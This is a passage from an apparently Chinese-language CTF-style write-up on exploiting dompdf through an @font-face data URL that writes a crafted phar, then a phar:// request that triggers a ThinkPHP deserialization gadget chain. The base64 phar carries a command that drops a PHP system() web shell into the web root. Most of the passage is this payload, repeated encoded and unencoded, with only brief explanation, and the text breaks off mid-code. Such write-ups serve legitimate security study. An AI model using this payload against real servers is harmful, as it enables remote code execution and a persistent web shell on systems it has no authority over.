class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fvendor%2Fdompdf%2Fdompdf%2Flib%2Ffonts%2Fexploit_normal_da94a27b825aeca64e86b19a3972972d.ttf%23%23&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 1 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">====== REQUEST 2 NOT ENCODED =======</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    @font-face &#123;</span><br><span class="line">        font-family:&#x27;exploit&#x27;;</span><br><span class="line">        src:url(&#x27;phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_da94a27b825aeca64e86b19a3972972d.ttf##&#x27;);</span><br><span class="line">        font-weight:&#x27;normal&#x27;;</span><br><span class="line">        font-style:&#x27;normal&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>将====== REQUEST 1 ENCODED =======先写入phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;@font-face+&#123;+font-family:&#x27;exploit&#x27;;+src:url(&#x27;data:text/plain;base64,UHJvZ3JhbSByb290OiAvdXNyCldhcm5pbmc6IEZvbnQgY29udGFpbmVkIG5vIGdseXBocwrvv73vv706Y3Z0ICF5Z2FzcO%252B%252Fve%252B%252FvWdseWY977%252B977%252B9PmFwCiAgICAgICAgICAgICAgICAgICAgICAgVGhlYWQhRe%252B%252Fve%252B%252Fve%252B%252FvTZoaGVhICRobXR477%252B9Ie%252B%252FvQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2EqbWF4cEc5OCBuYW1l77%252B9IylGYO%252B%252FvXBvc3Tvv73vv70yRCLvv712Tl8877%252B9CiAgICAgICAg77%252B977%252B9bkvvv73vv71uS%252B%252B%252FvSEq77%252B9Wu%252B%252Fve%252B%252FvUAu77%252B977%252B977%252B977%252B977%252B977%252B977%252B977%252B9MVBmRWTvv73vv73vv70g77%252B9OFrvv70gbCFNNOKWku%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvSF5KioqISrvv70u77%252B9Lzzvv73vv70y77%252B977%252B9PO%252B%252Fve%252B%252FvTLvv70vPO%252B%252Fve%252B%252FvTLvv73vv70877%252B977%252B9MjMhJzMjISAgICAgIO%252B%252Fve%252B%252Fve%252B%252Fve%252B%252Fve%252B%252FvWYhWO%252B%252FvQogICAgICAgIDVPJe%252B%252FvSAgICDvv70gICAgICAgKyAgICAgICAgICAgICAgICEgICAgICAgPyAgICAgICBKVyAgICAgIO%252B%252FvSAgICAgICDvv70gICBEVU1NWSBGT05URFVNTVkgRk9OVFVudGl0bGVkMVVudGl0bGVkMVJlZ3VsYXJSZWd1bGFyRm9udEZvcmdlIDIuMCA6IFVudGl0bGVkMSA6IDI2LTQtMjAyM0ZvbnRGb3JnZSAyLjAgOiBVbnRpdGxlZDEgOiAyNi00LTIwMjNVbnRpdGxlZDFVbnRpdGxlZDFWZXJzaW9uIDAwMS4wMDBWZXJzaW9uIDAwMS4wMDBVbnRpdGxlZDFVbnRpdGxlZDHvv73vv70y77%252B977%252B977%252B977%252B977%252B9de%252B%252FvW5L77%252B977%252B9bkvvv70KPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpVCgAAAQAAABEAAAABAAAAAAAfCgAATzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NTp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7YjowO3M6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzozMDoidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGVkIjoyOntzOjEwOiIAKgBoYW5kbGVyIjtPOjI3OiJ0aGlua1xjYWNoZVxkcml2ZXJcTWVtY2FjaGUiOjM6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO2I6MDtzOjY6InByZWZpeCI7czowOiIiO3M6NDoicGF0aCI7czowOiIiO3M6MTM6ImRhdGFfY29tcHJlc3MiO2I6MDt9czoxMDoiACoAaGFuZGxlciI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mjp7czo2OiIAKgBnZXQiO2E6MTp7czoxODoiSEVYRU5TPGdldEF0dHI%252Bbm88IjtzOjU0OiJlY2hvICc8P3BocCBzeXN0ZW0oKTsgPz4nID4gL3Zhci93d3cvaHRtbC9wdWJsaWMvMS5waHAiO31zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YTo3OntzOjQ6Imhvc3QiO3M6OToiMTI3LjAuMC4xIjtzOjQ6InBvcnQiO2k6MTEyMTE7czo2OiJleHBpcmUiO2k6MzYwMDtzOjc6InRpbWVvdXQiO2k6MDtzOjEyOiJzZXNzaW9uX25hbWUiO3M6NjoiSEVYRU5TIjtzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czowOiIiO319czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fX19czoxMToiACoAYmluZEF0dHIiO2E6Mjp7aTowO3M6Mjoibm8iO2k6MTtzOjM6IjEyMyI7fX1zOjk6IgAqAHBhcmVudCI7TzoyMDoidGhpbmtcY29uc29sZVxPdXRwdXQiOjI6e3M6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6Mjp7czoxMDoiACoAaGFuZGxlciI7TzoyNzoidGhpbmtcY2FjaGVcZHJpdmVyXE1lbWNhY2hlIjozOntzOjEwOiIAKgBvcHRpb25zIjthOjU6e3M6NjoiZXhwaXJlIjtpOjA7czoxMjoiY2FjaGVfc3ViZGlyIjtiOjA7czo2OiJwcmVmaXgiO3M6MDoiIjtzOjQ6InBhdGgiO3M6MDoiIjtzOjEzOiJkYXRhX2NvbXByZXNzIjtiOjA7fXM6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6MTg6IkhFWEVOUzxnZXRBdHRyPm5vPCI7czo1NDoiZWNobyAnPD9waHAgc3lzdGVtKCk7ID8%252BJyA%252BIC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhwIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czo2OiIAKgB0YWciO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo0OiJob3N0IjtzOjk6IjEyNy4wLjAuMSI7czo0OiJwb3J0IjtpOjExMjExO3M6NjoiZXhwaXJlIjtpOjM2MDA7czo3OiJ0aW1lb3V0IjtpOjA7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjY6IkhFWEVOUyI7czo4OiJ1c2VybmFtZSI7czowOiIiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fXM6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjMwOiJ0aGlua1xzZXNzaW9uXGRyaXZlclxNZW1jYWNoZWQiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjc6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZSI6Mzp7czoxMDoiACoAb3B0aW9ucyI7YTo1OntzOjY6ImV4cGlyZSI7aTowO3M6MTI6ImNhY2hlX3N1YmRpciI7YjowO3M6NjoicHJlZml4IjtzOjA6IiI7czo0OiJwYXRoIjtzOjA6IiI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjEwOiIAKgBoYW5kbGVyIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjoyOntzOjY6IgAqAGdldCI7YToxOntzOjE4OiJIRVhFTlM8Z2V0QXR0cj5ubzwiO3M6NTQ6ImVjaG8gJzw%252FcGhwIHN5c3RlbSgpOyA%252FPicgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy8xLnBocCI7fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NDoiaG9zdCI7czo5OiIxMjcuMC4wLjEiO3M6NDoicG9ydCI7aToxMTIxMTtzOjY6ImV4cGlyZSI7aTozNjAwO3M6NzoidGltZW91dCI7aTowO3M6MTI6InNlc3Npb25fbmFtZSI7czo2OiJIRVhFTlMiO3M6ODoidXNlcm5hbWUiO3M6MDoiIjtzOjg6InBhc3N3b3JkIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9fX19fX0IAAAAdGVzdC50eHQEAAAAthRJZAQAAAAMfn%252FYpAEAAAAAAAB0ZXN022l2ia1yjzHI4j9%252F%252FNeso0pc1gcCAAAAR0JNQg%253D%253D&#x27;);+font-weight:&#x27;normal&#x27;;+font-style:&#x27;normal&#x27;;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>这里传content是因为审计源码的时候发现</p><p><img src="../images/image-20230426203507788.png" alt="image-20230426203507788"></p><p><img src="../images/image-20230426203522154.png" alt="image-20230426203522154"></p><p><img src="../images/image-20230426203609835.png" alt="image-20230426203609835"></p><p>知道这些以后，就可以去尝试post参数了</p><p><img src="../images/image-20230426203735353.png" alt="image-20230426203735353"></p><p>然后接着post第二个参数</p><p>触发phar</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 